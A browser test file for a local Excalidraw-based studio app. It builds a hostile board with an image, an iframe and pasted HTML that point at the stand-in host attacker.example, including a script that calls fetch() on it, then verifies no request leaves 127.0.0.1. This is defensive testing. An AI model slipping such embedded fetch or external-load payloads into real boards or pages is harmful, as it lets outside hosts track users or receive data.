// A board made to reach outside the studio (security review B1, I1): a picture whose "file" is a web address, an
// iframe element with HTML that loads a picture and a stylesheet from elsewhere, and a YouTube embed. Opening it,
// dropping it on the canvas as a file, pasting it, and pressing Send to Video on its shot must send no request
// anywhere but 127.0.0.1.
import { launch, studioPage, api, openBoardView, deleteAllBoards, check, finish, external } from './lib.mjs';

const EVIL = 'https://attacker.example';
const base = { angle: 0, strokeColor: '#1e1e1e', backgroundColor: 'transparent', fillStyle: 'solid', strokeWidth: 2,
  strokeStyle: 'solid', roughness: 1, opacity: 100, groupIds: [], roundness: null, seed: 1, version: 1, versionNonce: 1,
  isDeleted: false, boundElements: null, updated: 1, link: null, locked: false };
const hostile = {
  type: 'excalidraw', version: 2, source: 'https://excalidraw.com',
  elements: [
    { ...base, id: 'frame1', type: 'frame', x: 0, y: 0, width: 600, height: 400, name: 'Evil shot', frameId: null, index: 'a0' },
    { ...base, id: 'pic1', type: 'image', x: 40, y: 80, width: 300, height: 200, fileId: 'f1', status: 'saved', scale: [1, 1], frameId: 'frame1', index: 'a1' },
    { ...base, id: 'txt1', type: 'text', x: 40, y: 20, width: 300, height: 25, text: 'A fox at night', originalText: 'A fox at night',
      fontSize: 20, fontFamily: 5, textAlign: 'left', verticalAlign: 'top', containerId: null, lineHeight: 1.25, autoResize: true, frameId: 'frame1', index: 'a2' },
    { ...base, id: 'ifr1', type: 'iframe', x: 700, y: 0, width: 400, height: 300, frameId: null, index: 'a3',
      customData: { generationData: { status: 'done', html: `<img src="${EVIL}/iframe-img.png"><link rel="stylesheet" href="${EVIL}/iframe.css"><script>fetch("${EVIL}/js")</script>` } } },
    { ...base, id: 'emb1', type: 'embeddable', x: 700, y: 400, width: 400, height: 300, frameId: null, index: 'a4', link: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ' },
  ],
  appState: { viewBackgroundColor: '#ffffff' },
  files: { f1: { id: 'f1', mimeType: 'image/png', dataURL: `${EVIL}/file.png`, created: 1 } },
};

const browser = await launch();
const page = await studioPage(browser, 'hostile');
await openBoardView(page);
await deleteAllBoards(page);

// 1. A saved board (someone else's file put in data/boards/).
const saved = await api(page, '/api/boards/save', { name: 'Hostile', board: hostile, create: true });
check(saved.status === 200, 'the engine stores the hostile board as data');
await page.reload();
await page.waitForSelector('.excalidraw .excalidraw__canvas', { timeout: 30000 });
await page.selectOption('#boardOpen', 'b:Hostile');
await page.waitForTimeout(2500);
check(/left out/.test(await page.textContent('.board-note')), 'the page says what it left out');
const shot = await page.evaluate(() => [...document.querySelectorAll('.board-shot')].map((li) => ({
  prompt: li.querySelector('.board-shot-prompt').textContent, img: li.querySelector('img') && li.querySelector('img').getAttribute('src'),
})));
check(shot.length === 1 && shot[0].prompt === 'A fox at night' && shot[0].img === null, 'the shot keeps its words and has no picture');
check(await page.locator('.excalidraw iframe').count() === 0, 'no iframe is on the page');

// 2. Send to Video on that shot: words only, nothing fetched.
await page.locator('.board-shot').first().getByRole('button', { name: 'Send to Video' }).click();
await page.waitForTimeout(800);
check((await page.inputValue('#prompt')) === 'A fox at night', 'Send to Video fills the words');
check((await page.locator('#tray img').count()) === 0, 'and no start picture');
await page.click('#boardBtn');
await page.waitForTimeout(500);

// 3. The same board dropped on the canvas as a file opens untitled, through the same checks.
const dropNote = await page.evaluate(async (text) => {
  const dt = new DataTransfer();
  dt.items.add(new File([text], 'evil.excalidraw', { type: 'application/json' }));
  const target = document.querySelector('.board-canvas .excalidraw');
  const box = target.getBoundingClientRect();
  target.dispatchEvent(new DragEvent('drop', { dataTransfer: dt, bubbles: true, cancelable: true, clientX: box.x + 300, clientY: box.y + 300 }));
  await new Promise((r) => setTimeout(r, 1500));
  return document.querySelector('.board-note').textContent;
}, JSON.stringify(hostile));
check(/left out/.test(dropNote), 'a dropped hostile board is opened with the web files left out');
check((await page.textContent('.board-state')).startsWith('Untitled board'), 'and opens as an untitled board');

// 4. Pasted: copied elements with the web file, and HTML with a web picture.
const pasteNotes = await page.evaluate(async ([clip, evil]) => {
  const out = [];
  for (const [type, text] of [['text/plain', clip], ['text/html', `<p>hi</p><img src="${evil}/paste.png">`]]) {
    document.querySelector('.board-note').textContent = '';
    const dt = new DataTransfer();
    dt.setData(type, text);
    document.dispatchEvent(new ClipboardEvent('paste', { clipboardData: dt, bubbles: true, cancelable: true }));
    await new Promise((r) => setTimeout(r, 800));
    out.push(document.querySelector('.board-note').textContent);
  }
  return out;
}, [JSON.stringify({ type: 'excalidraw/clipboard', elements: hostile.elements, files: hostile.files }), EVIL]);
check(pasteNotes.every((n) => /does not load/.test(n)), 'pastes that reach the web are refused');

await page.waitForTimeout(1500);
check(external.length === 0, 'no request left 127.0.0.1');
await deleteAllBoards(page);
await browser.close();
finish();
